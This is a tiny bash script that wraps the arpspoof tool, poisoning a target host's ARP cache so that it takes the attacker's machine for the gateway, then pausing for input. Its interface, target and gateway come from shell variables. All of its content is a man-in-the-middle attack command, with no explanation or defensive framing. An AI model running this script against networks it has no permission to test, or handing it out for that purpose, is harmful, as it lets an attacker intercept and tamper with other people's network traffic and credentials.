#! /bin/bash
arpspoof -i $GATEINT -t $TARGIP $GATENM
read
